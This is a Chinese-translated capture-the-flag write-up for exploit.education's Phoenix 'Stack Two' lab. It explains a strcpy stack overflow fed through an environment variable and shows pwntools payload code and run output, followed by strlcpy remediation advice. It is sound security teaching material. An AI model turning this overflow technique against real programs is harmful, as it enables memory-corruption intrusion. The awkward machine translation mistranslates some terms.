<html>
<head>
<title>Phoenix Challenges — Stack Two</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">凤凰城挑战赛—堆栈二</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/phoenix-challenges-stack-two-da59b290dfa?source=collection_archive---------2-----------------------#2022-10-30">https://infosecwriteups.com/phoenix-challenges-stack-two-da59b290dfa?source=collection_archive---------2-----------------------#2022-10-30</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/25c0eab8264250ef2ce6294c9cf0a2ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:550/format:webp/1*VF7g7NCBHBIU3Wxw8XIjmA.png"/></div></figure><h1 id="467c" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">挑战</h1><p id="fe1f" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">挑战的描述和源代码位于<a class="ae lq" href="http://exploit.education/phoenix/stack-two/" rel="noopener ugc nofollow" target="_blank">这里</a>。它和所有其他Phoenix二进制文件都位于<strong class="ku ir"> /opt/phoenix/amd64 </strong>目录中。一篇<a class="ae lq" href="https://medium.com/@secnate/phoenix-challenges-getting-set-up-a2783e0616c6" rel="noopener">的前一篇文章</a>描述了如何为这些挑战设置虚拟机，如果还没有这样做的话。</p><h1 id="e655" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">文件</h1><p id="be39" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">我们使用下面的方法来检查<em class="lr">栈两个</em>文件的属性。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="f2ce" class="mb jv iq lx b gy mc md l me mf">nathan@nathan-VirtualBox:/opt/phoenix/amd64$ file stack-two</span><span id="6287" class="mb jv iq lx b gy mg md l me mf">stack-two: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped</span></pre><p id="9f32" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">我们知道，像<em class="lr">栈一</em>挑战一样，<em class="lr">栈二</em>文件也有</p><ol class=""><li id="5639" class="mm mn iq ku b kv mh kz mi ld mo lh mp ll mq lp mr ms mt mu bi translated">setuid属性。它表示该程序是以所有者的权限运行的。如果文件的所有者是root用户(在本例中不是)，则可以使用它来提升权限</li><li id="61f7" class="mm mn iq ku b kv mv kz mw ld mx lh my ll mz lp mr ms mt mu bi translated">符号，由<strong class="ku ir">未剥离</strong>属性指示。这意味着调试和分析二进制文件的人可以看到原始的变量和函数名</li><li id="23c9" class="mm mn iq ku b kv mv kz mw ld mx lh my ll mz lp mr ms mt mu bi translated">在执行过程中动态链接的共享库。这有助于识别所使用的标准函数</li><li id="fc83" class="mm mn iq ku b kv mv kz mw ld mx lh my ll mz lp mr ms mt mu bi translated">一个<strong class="ku ir"> ELF 64位LSB可执行文件，x86–64</strong>。ELF是文件格式，64位是字长，LSB表示它是little-endian(首先使用最低有效字节)，并且使用x86–64指令集。</li></ol><p id="18d7" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated"><strong class="ku ir">*剧透预警*: </strong>这不是巧合。<em class="lr">栈二</em>与<em class="lr">栈一</em>挑战非常相似，无论是从问题还是解决方案来看。</p><h1 id="94b1" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">目标</h1><p id="a6ed" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">查看<em class="lr">堆栈二的</em> C代码，我们看到存储在<strong class="ku ir">局部变量</strong>结构中的<strong class="ku ir"> changeme </strong>变量被初始化为0。目标是篡改其值，使其等于<strong class="ku ir"> 0x0d0a090a </strong>，以便打印所需的语句。</p><h1 id="0819" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">相关概念</h1><p id="15fe" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">有必要了解堆栈内存是如何工作的。我在凤凰栈零挑战的<a class="ae lq" rel="noopener ugc nofollow" target="_blank" href="/phoenix-challenges-stack-zero-f8743cc871ed">文章里写了一篇很长的解释，有兴趣的可以看看。</a></p><p id="8e9a" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">还需要了解什么是<em class="lr">环境变量</em>。它们是计算机系统的执行环境中的变量，可以配置/影响当前正在进行或将要执行的进程或程序。</p><p id="20c9" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">虽然大多数人在使用Linux机器时对它们很熟悉，但它们也存在于Windows中。以下是Windows 10的一些例子:</p><figure class="ls lt lu lv gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi na"><img src="../Images/df51de33a78dc0586c442a8c6aed265e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gpBtiSy0GXYyANACzdj49Q.png"/></div></div></figure><p id="5a55" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">让我们转向Linux，因为这个挑战是在它上面运行的。Linux环境变量或者具有<strong class="ku ir">全局</strong>或者<strong class="ku ir">局部</strong>范围:</p><ul class=""><li id="c9b5" class="mm mn iq ku b kv mh kz mi ld mo lh mp ll mq lp nf ms mt mu bi translated"><strong class="ku ir">全局环境变量:</strong>它们可以被当前的Linux终端以及在其中运行的任何进程、shell脚本或程序使用。它们要么在Linux配置文件中定义，要么用<strong class="ku ir">export&lt;varname&gt;=&lt;value&gt;</strong>终端命令定义。</li><li id="6182" class="mm mn iq ku b kv mv kz mw ld mx lh my ll mz lp nf ms mt mu bi translated"><strong class="ku ir">本地环境变量:</strong>它们只能被定义它们的Linux终端使用。即使进程或程序是在终端(定义它们的终端)中启动的，他们也不能访问它。它们是用<strong class="ku ir">&lt;varname&gt;=&lt;value&gt;</strong>终端命令定义的</li></ul><h1 id="e7ea" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">虫子</h1><p id="5715" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">所有<em class="lr">堆栈二的</em>数据都存储在堆栈上，其中<em class="lr">局部变量</em>结构的<em class="lr">缓冲区</em>和<em class="lr"> changeme </em>变量是相邻的邻居。存入缓冲区的多余数据将溢出到<em class="lr"> changeme </em>变量并影响其值。这种溢出是由<strong class="ku ir"> strcpy() </strong>函数引起的，该函数将存储在<em class="lr"> ExploitEducation </em>环境变量中的文本写入<em class="lr"> locals.buffer </em>中，而不进行任何边界检查。</p><h1 id="e9bb" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">利用</h1><p id="0366" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">输入写入的<em class="lr"> locals.buffer </em>有64个字符的空间。由于<em class="lr"> locals.changeme </em>变量最初为0，漏洞需要篡改其内存位置，以使其具有所需的<strong class="ku ir"> 0x0d0a090a </strong>值。这是通过输入一个64个字符的输入字符串来完全占据缓冲区的内存，并附加额外的数据来确保<em class="lr"> changeme </em>变量被<strong class="ku ir"> 0x0d0a090a </strong>值完全覆盖。</p><p id="f12a" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">这个漏洞利用的过程将会很快；<em class="lr"> Stack Two </em>在各方面都与<em class="lr"> Stack One </em> challenge相同，除了精心制作的有效载荷通过<em class="lr"> ExploitEducation </em>环境变量而不是程序参数传递到程序中。[那些不熟悉<a class="ae lq" href="https://medium.com/bugbountywriteup/phoenix-challenges-stack-one-4a9d2100274f" rel="noopener">我对Stack One挑战的解决方案</a>的人可能想回顾一下它的历史背景]</p><p id="a12c" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">是时候利用这个漏洞了。<strong class="ku ir"> exploit.py </strong>文件第14行的有效负载是</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="3489" class="mb jv iq lx b gy mc md l me mf">payload = cyclic(64) + p32(0xdeadbeef)</span></pre><p id="ddd0" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">它在<strong class="ku ir"> exploit.py </strong>文件的第20行被传递到stack-two程序的执行中</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="9e5b" class="mb jv iq lx b gy mc md l me mf">p = process(["stack-two"], env={ "ExploitEducation" : payload }, cwd="/opt/phoenix/amd64")</span></pre><p id="e801" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">注意<code class="fe ng nh ni lx b">env={"ExploitEducation":payload}</code>。当Pwntools为启动stack-two二进制文件创建一个新的终端进程时，<strong class="ku ir"> env </strong>字典指定<em class="lr"> ExploitEducation </em>环境变量的值在启动时初始化。因为<strong class="ku ir"> env </strong>字典没有其他条目，所以没有其他环境变量被初始化。<em class="lr"> ExploitEducation </em>是一个全局环境变量，因为<em class="lr"> stack-two </em>程序在执行时使用它。</p><p id="ead4" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">使用<strong class="ku ir"> env={ &lt; data &gt; } </strong>字典控制环境变量的值在漏洞开发和稳定过程中非常重要。这是因为环境变量位于堆栈底部，它们的长度会影响特定函数堆栈数据在可用内存区域中的位置。</p><figure class="ls lt lu lv gt jr gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/95e1ca7930ada15754fb22ab38ab6e19.png" data-original-src="https://miro.medium.com/v2/resize:fit:894/format:webp/0*fA-Hdo55MMGyrsyu.png"/></div></figure><p id="b692" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">如果Pwntools的进程启动命令中没有这样的<strong class="ku ir"> env </strong>字典，初始化的终端进程将继承原来执行环境的环境变量。⁴许多CTF开发者利用这个事实来摆脱那些忘记手动控制漏洞执行环境中的环境变量的玩家。挑战主机被配置为初始化不同的环境变量。有些甚至在每次运行新程序时都初始化不同的环境变量。制造攻击移动存储位置的漏洞非常困难，如果几乎不可能的话。</p><blockquote class="nk nl nm"><p id="e306" class="ks kt lr ku b kv mh kx ky kz mi lb lc nn mj lf lg no mk lj lk np ml ln lo lp ij bi translated">专业提示:总是用<strong class="ku ir"> env </strong>字典来控制已启动进程的环境变量的值！如果不需要，用<strong class="ku ir"> env={} </strong>初始化Pwntools脚本中启动的进程</p></blockquote><p id="eec0" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">好的，我创建了基本的漏洞，并通过<em class="lr"> ExploitEducation </em>环境变量将它传入。由于我控制了流程环境变量的长度和值，所以<em class="lr"> stack-two </em>执行环境有一个稳定的堆栈。下一步是测试<strong class="ku ir"> 0xdeadbeef </strong>是否用方便包含的打印输出完全覆盖了<strong class="ku ir"> changeme </strong>变量:</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="7e5b" class="mb jv iq lx b gy mc md l me mf">nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-two$ ./exploit.py<br/>Launching The Stack Two Exploit!<br/>[!] Could not find executable 'stack-two' in $PATH, using '/opt/phoenix/amd64/stack-two' instead<br/>[+] Starting local process '/opt/phoenix/amd64/stack-two': pid 5478<br/>[*] Switching to interactive mode<br/>[*] Process '/opt/phoenix/amd64/stack-two' stopped with exit code 0 (pid 5478)<br/>Welcome to phoenix/stack-two, brought to you by https://exploit.education<br/>Almost! changeme is currently 0xdeadbeef, we want 0x0d0a090a<br/>[*] Got EOF while reading in interactive</span></pre><p id="f300" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">确实如此。最后一步是用<strong class="ku ir"> 0x0d0a090a </strong>替换有效载荷的<strong class="ku ir"> 0xdeadbeef </strong>值，看:</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="63a8" class="mb jv iq lx b gy mc md l me mf">nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-two$ ./exploit.py<br/>Launching The Stack Two Exploit!<br/>[!] Could not find executable 'stack-two' in $PATH, using '/opt/phoenix/amd64/stack-two' instead<br/>[+] Starting local process '/opt/phoenix/amd64/stack-two': pid 5485<br/>[*] Switching to interactive mode<br/>[*] Process '/opt/phoenix/amd64/stack-two' stopped with exit code 0 (pid 5485)<br/>Welcome to phoenix/stack-two, brought to you by https://exploit.education<br/>Well done, you have successfully set changeme to the correct value<br/>[*] Got EOF while reading in interactive</span></pre><p id="cb0e" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">漏洞代码可以在我的<a class="ae lq" href="https://github.com/secnate/Exploit-Education-CTFs" rel="noopener ugc nofollow" target="_blank"> Github知识库</a>中找到。</p><h1 id="d637" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">补救</h1><p id="ee56" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">为了防止这样的内存损坏错误，我会敦促开发人员不要用C编写，而要过渡到内存安全的语言，如Python或Rust。</p><p id="986a" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">如果除了使用C别无选择，我会警告不要使用<a class="ae lq" href="https://www.geeksforgeeks.org/why-strcpy-and-strncpy-are-not-safe-to-use/" rel="noopener ugc nofollow" target="_blank"> <strong class="ku ir"> strcpy </strong> </a>函数从任何地方提取输入。正如刚才看到的，它继续读取输入，直到看到终止空值(' \0 ')，而不管目的缓冲区的大小。</p><p id="9d5a" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">应改为使用<a class="ae lq" href="https://man.openbsd.org/strlcpy.3" rel="noopener ugc nofollow" target="_blank"> <strong class="ku ir"> strlcpy </strong> </a>函数。它将输入写入目标缓冲区，直到达到指定的大小，并以空字符(' \0 ')终止缓冲区。</p><p id="95bd" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">源代码的<code class="fe ng nh ni lx b">strcpy(locals.buffer, ptr);</code>行将是</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="a28c" class="mb jv iq lx b gy mc md l me mf">strlcpy(locals.buffer, ptr, 64);</span></pre></div><div class="ab cl nq nr hu ns" role="separator"><span class="nt bw bk nu nv nw"/><span class="nt bw bk nu nv nw"/><span class="nt bw bk nu nv"/></div><div class="ij ik il im in"><p id="826e" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">目前就这些。敬请期待下一次挑战！</p><p id="332b" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">这篇CTF挑战赛的文章最初发表在内森·帕夫洛夫斯基的个人博客上:<a class="ae lq" href="http://secnate.github.io/" rel="noopener ugc nofollow" target="_blank"> secnate.github.io </a></p><p id="6d94" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated"><strong class="ku ir">引文:</strong></p><p id="dd93" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated"><a class="ae lq" href="https://learn.microsoft.com/en-us/windows/deployment/usmt/usmt-recognized-environment-variables" rel="noopener ugc nofollow" target="_blank">https://learn . Microsoft . com/en-us/windows/deployment/usmt/usmt-recognized-environment-variables</a></p><p id="975e" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated"><a class="ae lq" href="https://www.geeksforgeeks.org/environment-variables-in-linux-unix/" rel="noopener ugc nofollow" target="_blank">https://www . geeks forgeeks . org/environment-variables-in-Linux-UNIX/</a></p><p id="ab56" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated"><a class="ae lq" href="https://codeburst.io/linux-environment-variables-53cea0245dc9?gi=bc53be032c14" rel="noopener" target="_blank">https://code burst . io/Linux-环境-变量-53cea0245dc9？gi=bc53be032c14 </a></p><p id="f55a" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">https://docs.pwntools.com/en/stable/tubes/processes.html<a class="ae lq" href="https://docs.pwntools.com/en/stable/tubes/processes.html" rel="noopener ugc nofollow" target="_blank">⁴</a></p></div><div class="ab cl nq nr hu ns" role="separator"><span class="nt bw bk nu nv nw"/><span class="nt bw bk nu nv nw"/><span class="nt bw bk nu nv"/></div><div class="ij ik il im in"><h2 id="664f" class="mb jv iq bd jw nx ny dn ka nz oa dp ke ld ob oc ki lh od oe km ll of og kq oh bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae lq" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>